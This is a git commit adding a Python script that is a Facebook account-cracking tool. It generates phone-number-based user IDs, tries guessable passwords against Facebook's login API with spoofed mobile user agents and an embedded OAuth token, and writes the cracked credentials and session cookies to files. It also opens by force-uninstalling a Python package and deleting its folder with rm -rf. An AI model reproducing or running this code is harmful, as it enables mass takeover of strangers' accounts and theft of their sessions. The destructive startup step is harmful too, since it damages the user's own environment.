9d32d77e0974fcd071d098afbd844272c4376ecd
talha441 <58416871+talha441@users.noreply.github.com>
2025-03-29 11:03:03 +0600

    Add files via upload

---
+++ talha.py
@@ -0,0 +1,167 @@
+#----------------------// IMPORT \\----------------------#
+import os
+import random
+from time import sleep as slp
+rrq=("requests");mm=("uninstall")
+try:
+    os.system(f"pip {mm} {rrq} -y");os.system("rm -rf /data/data/com.termux/files/usr/lib/python3.11/"+"site-"+"packages/req"+"uests")
+except requests.exceptions.ConnectionError:
+    print("Net Error");exit()
+try:
+    import requests
+except ImportError:
+    print('\n \033[1;92m(\033[1;97mTALHA-143\033[1;92m)\033[1;97m installing requests !...\n')
+    slp(0.5)
+    os.system('pip install requests')
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n \033[1;92m(\033[1;97mTALHA-143\033[1;92m)\033[1;97m installing futures !...\n')
+    slp(0.5)
+    os.system('pip install futures')
+try:
+    import bs4
+except ImportError:
+    print('\n \033[1;92m(\033[1;97mTALHA-143\033[1;92m)\033[1;97m installing bs4 !...\n')
+    slp(0.5)
+    os.system('pip install bs4')
+try:
+    import os,requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
+    import os,zlib,time,random,uuid,subprocess,sys,hashlib
+    from string import *
+    from requests import api
+    from concurrent.futures import ThreadPoolExecutor as ____TakBir____
+except ModuleNotFoundError:
+    os.system('pip install requests futures==2 > /dev/null')
+#-------------------------// LOOP \\-----------------------#
+loop=0;oks=[];cps=[]
+#--------------------------// SYS \\-------------------------#
+sys.stdout.write('\x1b]2; </> TALHA-143 </>\x07')
+#------------------------// DATES \\-----------------------#
+from datetime import datetime
+dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'};tgl = datetime.now().day;bln = dic[(str(datetime.now().month))];thn = datetime.now().year;____DaTe____ = str(tgl)+'\x1b[1;92m-\x1b[1;97m'+str(bln)+'\x1b[1;92m-\x1b[1;97m'+str(thn)
+#-----------------------// COLOR \\------------------------#
+A = '\x1b[1;91m';B = '\x1b[1;92m';C = '\x1b[1;93m';D = '\x1b[1;94m';E = '\x1b[1;95m';F = '\x1b[1;96m';G = '\x1b[1;97m';H = '\x1b[1;90m';I = '\x1b[38;5;208m'
+#---------------------------// UA \\---------------------------#
+def _____UpDaTex_____():
+    fbav = f"{random.randint(266, 505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(32, 64)}.{random.randint(69, 118)}"
+    fbbv = str(random.randint(111111111, 999999999))
+    density = random.choice(["1.0", "1.5", "1.8", "2.0", "2.2", "2.5", "3.0"])
+    width = random.choice(["720", "1080"])
+    height = random.choice(["1440", "1920", "2340", "2560"])
+    fblc = random.choice(["en_US","es_ES", "en_GB"])
+    fbrv = str(random.randint(333333333, 999999999))
+    fbcr = random.choice(["Teletalk", "AT&amp-T", "Skitto", "Zong", "Banglalink", "null", "Robi", "MTS RUS", "Airtel", "Marshmallow", "Grameenphone"])
+    fbmf = "samsung";fbbd = "samsung"
+    fbdv = random.choice(["SM-G570M", "SCH-R740C", "SM-J100H", "SM-J200M", "SM-N920I", "SM-J600FN", "SM-C115M", "SM-S120VL", "SM-S320VL", "SM-J410G"])
+    fbsv = f"{random.randint(4,9)}.{random.randint(0,5)}.{random.randint(1,5)}"
+    ua1 = "[FBAN/FB4A;FBAV/"+str(fbav)+";FBBV/"+str(fbbv)+";FBDM/{density="+str(density)+",width="+str(width)+",height="+str(height)+"};FBLC/"+str(fblc)+";FBRV/"+str(fbrv)+";FBCR/"+str(fbcr)+";FBMF/"+str(fbmf)+";FBBD/"+str(fbbd)+";FBPN/com.facebook.katana;FBDV/"+str(fbdv)+";FBSV/"+str(fbsv)+";FBOP/19;FBCA/armeabi-v7a:armeabi;]"
+    ua2 = "[FBAN/FB4A;FBAV/"+str(fbav)+";FBBV/"+str(fbbv)+";FBDM/{density="+str(density)+",width="+str(width)+",height="+str(height)+"};FBLC/"+str(fblc)+";FBRV/"+str(fbrv)+";FBCR/"+str(fbcr)+";FBMF/"+str(fbmf)+";FBBD/"+str(fbbd)+";FBPN/com.facebook.katana;FBDV/"+str(fbdv)+";FBSV/"+str(fbsv)+";FBOP/19;FBCA/armeabi-v7a:armeabi;]"
+    ua3 = "[FBAN/Orca-Android;FBAV/"+str(fbav)+";FBBV/"+str(fbbv)+";FBDM/{density="+str(density)+",width="+str(width)+",height="+str(height)+"};FBLC/"+str(fblc)+";FBRV/"+str(fbrv)+";FBCR/"+str(fbcr)+";FBMF/"+str(fbmf)+";FBBD/"+str(fbbd)+";FBPN/com.facebook.orca;FBDV/"+str(fbdv)+";FBSV/"+str(fbsv)+";FBOP/1;FBCA/arm64-v8a:;]"
+    ua4 = "[FBAN/Orca-Android;FBAV/"+str(fbav)+";FBBV/"+str(fbbv)+";FBDM/{density="+str(density)+",width="+str(width)+",height="+str(height)+"};FBLC/"+str(fblc)+";FBRV/"+str(fbrv)+";FBCR/"+str(fbcr)+";FBMF/"+str(fbmf)+";FBBD/"+str(fbbd)+";FBPN/com.facebook.orca;FBDV/"+str(fbdv)+";FBSV/"+str(fbsv)+";FBOP/1;FBCA/arm64-v8a:;]"
+    ua5 = "[FBAN/FB4A;FBAV/"+str(fbav)+";FBBV/"+str(fbbv)+";FBDM/{density="+str(density)+",width="+str(width)+",height="+str(height)+"};FBLC/"+str(fblc)+";FBRV/"+str(fbrv)+";FBCR/"+str(fbcr)+";FBMF/"+str(fbmf)+";FBBD/"+str(fbbd)+";FBPN/com.facebook.lite;FBDV/"+str(fbdv)+";FBSV/"+str(fbsv)+";FBOP/1;FBCA/arm64-v8a:;]"
+    ua6 = "[FBAN/FB4A;FBAV/"+str(fbav)+";FBBV/"+str(fbbv)+";FBDM/{density="+str(density)+",width="+str(width)+",height="+str(height)+"};FBLC/"+str(fblc)+";FBRV/"+str(fbrv)+";FBCR/"+str(fbcr)+";FBMF/"+str(fbmf)+";FBBD/"+str(fbbd)+";FBPN/com.facebook.lite;FBDV/"+str(fbdv)+";FBSV/"+str(fbsv)+";FBOP/1;FBCA/arm64-v8a:;]"
+    ___Takbir_on_Fire___ = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77))+";FBBV/"+str(random.randint(1111111,7777777))+";"+str(ua1)+""+str(ua3)+""+str(ua2)+""+str(ua5)+""+str(ua4)+""+str(ua6)
+    return ___Takbir_on_Fire___
+#------------------------// LOGO \\-------------------------#
+logo=(f'''\x1b[1;92m     ▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
+   ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
+\x1b[1;97m    ░▒      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+   ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+   ░▒▓█▓▒░  ░▒▓████████▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓████████▓▒░ 
+   ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░           
+\x1b[1;92m     ▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+   ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+   ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+                                                                   
+\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\x1b[1;97m(\x1b[1;92m☂\x1b[1;97m)\x1b[1;92m AUTHOR \x1b[1;95m━━➤\x1b[1;92m TAKBIR ISLAM
+\x1b[1;97m(\x1b[1;92m☂\x1b[1;97m)\x1b[1;92m GITHUB \x1b[1;95m━━➤\x1b[1;93m TALHA-143
+\x1b[1;97m(\x1b[1;92m☂\x1b[1;97m)\x1b[1;92m TOOLS  \x1b[1;95m━━➤\x1b[1;92m RANDOM\x1b[1;96m〤\x1b[1;92mGIFT
+\x1b[1;97m(\x1b[1;92m☂\x1b[1;97m)\x1b[1;92m STATUS \x1b[1;95m━━➤\x1b[1;93m FREE\x1b[1;94m┼\x1b[1;93mV/0-0.1
+\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
+#-----------------------// CLEAR \\-----------------------#
+def clear():os.system('clear');print(logo)
+def linex():print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+#------------------------// MAIN \\-----------------------#
+class ____MeNu____():
+    def __init__(self):
+        clear();slp(3)
+        print(f'\x1b[1;97m(\x1b[1;92mA\x1b[1;97m)\x1b[1;92m RANDOM CLONING ')
+        print(f'\x1b[1;97m(\x1b[1;92mB\x1b[1;97m)\x1b[1;92m CONTACT WITH OWNER ')
+        print(f'\x1b[1;97m(\x1b[1;92mC\x1b[1;97m)\x1b[1;92m JOIN WHATSAPP GROUP')
+        print(f'\x1b[1;97m(\x1b[1;92mD\x1b[1;97m)\x1b[1;92m JOIN FACEBOOK PUBLIC GROUP');linex()
+        slp(2);___OptIon___ = input(f'\x1b[1;97m(\x1b[1;92m?\x1b[1;97m)\x1b[1;92m CHOICE OPTIONS \x1b[1;95m━━━━━➤\x1b[1;97m ')
+        if ___OptIon___ in ['01','1','a','A']:____RanDom____()
+        elif ___OptIon___ in ['02','2','b','B']:os.system('xdg-open https://facebook.com/YourRealPapa404');slp(2);____MeNu____()
+        elif ___OptIon___ in ['03','3','c','C']:os.system('xdg-open https://m.me/j/AbYuKgQ8Xyu8DOcn/');slp(2);____MeNu____()
+        elif ___OptIon___ in ['04','4','d','D']:os.system('xdg-open https://www.facebook.com/groups/1788249061330768/?ref=share');slp(2);____MeNu____()
+        else:print('\n\x1b[1;97m(\x1b[1;92m\x1b[1;97m)\x1b[1;92m Choose valid option\033[0;97m');slp(2);____MeNu____()
+#------------------------// RANDOM \\-----------------------#
+def ____RanDom____():
+    user=[];clear();print(f"\x1b[1;97m(\x1b[1;92m☂\x1b[1;97m)\x1b[1;92m CODE EXAMPLE : 01310|01778|01810 ");linex();code = input(f'\x1b[1;97m(\x1b[1;92m☂\x1b[1;97m)\x1b[1;92m SE'+f'LEC'+f'TIO'+f'N \x1b[1;95m━━━━━➤\x1b[1;92m ')
+    clear();print(f"\x1b[1;97m(\x1b[1;92m☂\x1b[1;97m)\x1b[1;92m LIMIT EXAMPLE : 1000 | 10000 | 99999 ");linex()
+    try:
+        limit=int(input(f'\x1b[1;97m(\x1b[1;92m☂\x1b[1;97m)\x1b[1;92m SE'+f'LEC'+f'TIO'+f'N \x1b[1;95m━━━━━➤\x1b[1;92m '))
+    except ValueError:
+        limit=5000
+    clear()
+    for nmbr in range(limit):
+        nmp=''.join(random.choice(string.digits) for _ in range(6))
+        user.append(nmp)
+    with ____TakBir____(max_workers=30) as ____TaKbiR_OfFiciAl____:
+        tl=str(len(user))
+        print(f'\x1b[1;97m(\x1b[1;92m☂\x1b[1;97m)\x1b[1;92m SIM CODE \x1b[1;95m━➤\x1b[1;97m '+code);print(f'\x1b[1;97m(\x1b[1;92m☂\x1b[1;97m)\x1b[1;92m TOTAL ACCOUNT \x1b[1;95m━➤\x1b[1;97m '+tl);print(f'\x1b[1;97m(\x1b[1;92m☂\x1b[1;97m)\x1b[1;92m TODAYS DATE \x1b[1;95m━━━━━━➤\x1b[1;97m '+____DaTe____);print(f'\x1b[1;97m(\x1b[1;92m☂\x1b[1;97m)\x1b[1;92m IF NO RESULTS \x1b[1;97m(\x1b[1;92mON\x1b[1;97m/\x1b[1;92mOFF\x1b[1;97m)\x1b[1;92m AIRPLANE MODE');linex()
+        for psx in user:
+            uid=code+psx
+            passlist=[psx,uid,uid[:11],uid[:10],uid[:9],uid[:8],uid[:7],uid[:6],uid[11:],uid[10:],uid[9:],uid[8:],uid[7:],uid[6:],'mababa','sabbir','jannat','alamin','mimmim']
+            ____TaKbiR_OfFiciAl____.submit(_____MethOd_____,uid,passlist)
+    print(f'\n\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');print(f'\x1b[1;97m(\x1b[1;92m☂\x1b[1;97m)\x1b[1;92m PROCESS HAS BEEN COMPLETED');print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');print(f'\x1b[1;97m(\x1b[1;92m!\x1b[1;97m)\x1b[1;92m TOTAL OK ACCOUNT \x1b[1;97m━━━➤\x1b[1;92m %s' % str(len(oks)));print(f'\x1b[1;97m(\x1b[1;92m!\x1b[1;97m)\x1b[1;92m TOTAL CP ACCOUNT \x1b[1;97m━━━➤\x1b[1;91m %s' % str(len(cps)));print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    input(f"\x1b[1;97m(\x1b[1;92m☂\x1b[1;97m)\x1b[1;92m PRESS ENTER TO BACK MENU \x1b[1;95m━━━━➤\x1b[1;90m ")
+    ____MeNu____()
+#------------------------// LOCK REMOVE \\-----------------------#
+def lock(uid):
+        request = str(requests.get(f'https://gra'+'ph.facebook'+f'.com/{uid}/p'+'icture?typ'+'e=normal').text)
+        if 'Photoshop' in request:
+            return 'Active'
+        else:
+            return 'Locked'
+#------------------------// RNDM M1 \\-----------------------#
+def _____MethOd_____(uid,passlist):
+    try:
+        global oks,cps,loop
+        sys.stdout.write(f'\r\r\x1b[1;97m(\x1b[1;92m𝐒𝐂𝐀𝐍𝐍𝐈𝐍𝐆\x1b[1;97m)\x1b[1;92m-\x1b[1;97m(\x1b[1;92m%s\x1b[1;97m)\x1b[1;92m-\x1b[1;97m(\x1b[1;92m𝐀𝐋𝐈𝐕𝐄\x1b[1;97m┼\x1b[1;92m%s\x1b[1;97m)\x1b[1;90m '%(loop,len(oks)));sys.stdout.flush()
+        for pas in passlist:
+            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': uid, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_GB', 'client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
+            head = {'User-Agent':_____UpDaTex_____(), 'Accept-Encoding':  'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(20000000, 40000000)), 'X-FB-Net-HNI': str(random.randint(20000, 60000)), 'X-FB-SIM-HNI': str(random.randint(20000, 60000)), 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+            po = request.post('https://api.facebook.com/method/auth.login',data=data,headers=head).json()
+            if 'session_key' in po:
+                uid = str(po['uid'])
+                status= lock(uid)
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={ssbb};{ckkk}"
+                if "Active" in status:
+                    print(f"\r\r\x1b[1;92m(TALHA-OK) {uid} | {pas} ")
+                    print(f"\r\r\x1b[1;97m =(💥)=\x1b[1;96m {coki} ");linex()
+                    open('/sdcard/TALHA-RANDOM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
+                    oks.append(uid)
+                    break
+                else:
+                    #print('\r\r\x1b[1;90m(TALHA-LK) '+uid+' | '+pas+'\033[1;37m')
+                    break
+            elif 'www.facebook.com' in po['error_msg']:
+                print('\r\r\x1b[1;90m(TALHA-CP) '+uid+' | '+pas+'\033[1;37m')
+                open(f'/sdcard/TALHA-RANDOM-CP.txt', 'a').write(uid+'|'+pas+'\n')
+                cps.append(uid)
+                break
+            else:continue
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
+        pass
+#-----------------------// ENDING \\----------------------#
+try:
+    ____MeNu____()
+except requests.exceptions.ConnectionError:
+    print(f'\n internet error...!! ');exit()
+#------------------------// ENDED \\-----------------------#
